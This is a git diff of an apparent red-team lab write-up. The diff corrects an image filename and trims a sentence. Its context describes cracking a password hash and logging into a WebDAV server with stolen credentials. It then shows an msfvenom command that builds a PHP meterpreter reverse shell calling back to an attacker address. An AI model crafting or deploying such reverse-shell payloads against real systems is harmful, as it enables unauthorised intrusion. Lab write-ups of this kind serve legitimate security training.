@@ -58,9 +58,9 @@ Now to login to the Secret Folder & see what's there. Logging in allowed me to f
 
 ![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt-hash-id.JPG "Hash-Identifier")
 
-![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt-crakstation.JPG "crackstation.net")
+![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt-crackstation.JPG "crackstation.net")
 
-Followed the directions to gain access to the WebDAV server & logged in with Ryan's credentials. Found a file called password.dav, was unable to get it to open. Found the WebDAV had remote unrestricted upload permissions. Crafted a payload using MSFVenom to create a PHP reverse shell and uploaded into the WebDAV directory.
+Followed the directions to gain access to the WebDAV server & logged in with Ryan's credentials. Found the WebDAV had remote unrestricted upload permissions. Crafted a payload using MSFVenom to create a PHP reverse shell and uploaded into the WebDAV directory.
 
 ```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 > exploit.php
